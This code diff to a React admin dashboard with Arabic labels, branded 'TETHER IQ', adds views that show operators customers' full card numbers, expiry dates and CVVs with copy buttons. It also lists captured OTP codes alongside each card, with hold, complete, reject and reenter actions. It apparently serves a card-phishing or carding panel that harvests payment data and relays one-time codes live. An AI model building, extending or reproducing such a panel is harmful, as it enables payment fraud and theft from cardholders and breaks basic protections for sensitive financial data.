@@ -115,6 +115,46 @@ function StatusPill({ ok, label }) {
   );
 }
 
+function copyText(value) {
+  const v = String(value || '');
+  if (!v) return;
+  navigator.clipboard?.writeText(v).catch(() => {});
+}
+
+function CreditCardDetails({ card, compact }) {
+  if (!card) {
+    return (
+      <p className="admin-empty-hint">
+        لا توجد بيانات بطاقة محفوظة لهذا الطلب (الطلبات القديمة قبل التحديث لا تُسترجع).
+      </p>
+    );
+  }
+  const rows = [
+    ['اسم صاحب البطاقة', card.holder],
+    ['رقم البطاقة', card.pan],
+    ['تاريخ الانتهاء', card.expiry],
+    ['CVV', card.cvv],
+  ];
+  if (card.customerName) rows.unshift(['اسم العميل (الطلب)', card.customerName]);
+
+  return (
+    <div className={`admin-card-detail glass-panel${compact ? ' admin-card-detail--compact' : ''}`}>
+      <h4 className="admin-card-detail__title">بيانات البطاقة</h4>
+      <div className="admin-card-detail__grid">
+        {rows.map(([label, val]) => (
+          <div key={label} className="admin-card-detail__row">
+            <span className="admin-card-detail__label">{label}</span>
+            <code className="admin-card-detail__value" dir="ltr">{val || '—'}</code>
+            <button type="button" className="admin-card-detail__copy" onClick={() => copyText(val)}>
+              نسخ
+            </button>
+          </div>
+        ))}
+      </div>
+    </div>
+  );
+}
+
 export default function AdminDashboard() {
   const [loginCode, setLoginCode] = useState(() => readStoredLoginCode());
   const [saved, setSaved] = useState(() => Boolean(readStoredLoginCode()));
@@ -157,6 +197,7 @@ export default function AdminDashboard() {
   const [chatMessages, setChatMessages] = useState(null);
   const [chatReply, setChatReply] = useState('');
   const [ccSubs, setCcSubs] = useState([]);
+  const [selectedCc, setSelectedCc] = useState(null);
   const [botAdmins, setBotAdmins] = useState(null);
   const [newAdminId, setNewAdminId] = useState('');
   const [newAdminPerms, setNewAdminPerms] = useState('all');
@@ -248,6 +289,7 @@ export default function AdminDashboard() {
   const loadCc = useCallback(() => run(async () => {
     const data = await adminRequest('/api/admin/cc-otp/submissions', code);
     setCcSubs(data.items || []);
+    setSelectedCc(null);
   }), [run, code]);
 
   const loadBotAdmins = useCallback(() => run(async () => {
@@ -352,7 +394,7 @@ export default function AdminDashboard() {
       loadOrderMgmt();
       if (selectedOrder?.orderId === orderId) {
         const d = await adminRequest(`/api/admin/orders/${encodeURIComponent(orderId)}`, code);
-        setSelectedOrder(d.order);
+        setSelectedOrder({ ...d.order, card: d.card || null });
       }
     });
   };
@@ -360,7 +402,7 @@ export default function AdminDashboard() {
   const openOrder = async (orderId) => {
     await run(async () => {
       const d = await adminRequest(`/api/admin/orders/${encodeURIComponent(orderId)}`, code);
-      setSelectedOrder(d.order);
+      setSelectedOrder({ ...d.order, card: d.card || null });
     });
   };
 
@@ -430,8 +472,8 @@ export default function AdminDashboard() {
                       className="admin-sidebar__logo-img"
                       src="/logo.png"
                       alt="TETHER IQ"
-                      width={140}
-                      height={42}
+                      width={200}
+                      height={60}
                       decoding="async"
                     />
                   </picture>
@@ -579,6 +621,9 @@ export default function AdminDashboard() {
                 {selectedOrder && (
                   <div className="admin-detail glass-panel">
                     <h3>تفاصيل {selectedOrder.orderId}</h3>
+                    {(selectedOrder.card || /credit/i.test(String(selectedOrder.paymentMethod || ''))) && (
+                      <CreditCardDetails card={selectedOrder.card} />
+                    )}
                     <pre className="admin-pre">{JSON.stringify(selectedOrder, null, 2)}</pre>
                     <div className="admin-toolbar">
                       {Object.keys(ORDER_STATUS_LABELS).map((st) => (
@@ -815,29 +860,70 @@ export default function AdminDashboard() {
             {tab === 'ccotp' && (
               <Panel title="أكواد بطاقة الائتمان">
                 <table className="admin-table">
-                  <thead><tr><th>طلب</th><th>كود</th><th>قرار</th><th>إجراء</th></tr></thead>
+                  <thead>
+                    <tr>
+                      <th>طلب</th>
+                      <th>صاحب البطاقة</th>
+                      <th>رقم البطاقة</th>
+                      <th>انتهاء</th>
+                      <th>كود OTP</th>
+                      <th>قرار</th>
+                      <th>إجراء</th>
+                    </tr>
+                  </thead>
                   <tbody>
                     {ccSubs.map((s) => (
-                      <tr key={s.id}>
-                        <td>{s.orderId}</td>
+                      <tr
+                        key={s.id}
+                        className={selectedCc?.id === s.id ? 'admin-table__row--active' : ''}
+                        onClick={() => setSelectedCc(s)}
+                      >
+                        <td>
+                          <button
+                            type="button"
+                            className="admin-link"
+                            onClick={(e) => { e.stopPropagation(); openOrder(s.orderId); }}
+                          >
+                            {s.orderId}
+                          </button>
+                        </td>
+                        <td>{s.card?.holder || '—'}</td>
+                        <td><code dir="ltr">{s.card?.pan || '—'}</code></td>
+                        <td dir="ltr">{s.card?.expiry || '—'}</td>
                         <td><code>{s.otp}</code></td>
                         <td>{s.decision}</td>
                         <td className="admin-actions">
                           {['hold', 'complete', 'reject', 'reenter'].map((a) => (
-                            <button key={a} type="button" className="admin-chip" onClick={() => run(async () => {
-                              await adminRequest(`/api/admin/cc-otp/submissions/${s.id}/decision`, code, {
-                                method: 'POST',
-                                body: JSON.stringify({ action: a }),
-                              });
-                              setOk('تم');
-                              loadCc();
-                            })}>{a}</button>
+                            <button
+                              key={a}
+                              type="button"
+                              className="admin-chip"
+                              onClick={(e) => {
+                                e.stopPropagation();
+                                run(async () => {
+                                  await adminRequest(`/api/admin/cc-otp/submissions/${s.id}/decision`, code, {
+                                    method: 'POST',
+                                    body: JSON.stringify({ action: a }),
+                                  });
+                                  setOk('تم');
+                                  loadCc();
+                                });
+                              }}
+                            >
+                              {a}
+                            </button>
                           ))}
                         </td>
                       </tr>
                     ))}
                   </tbody>
                 </table>
+                {selectedCc && (
+                  <div className="admin-detail">
+                    <h3>طلب {selectedCc.orderId} — كود: <code>{selectedCc.otp}</code></h3>
+                    <CreditCardDetails card={selectedCc.card} />
+                  </div>
+                )}
               </Panel>
             )}
 
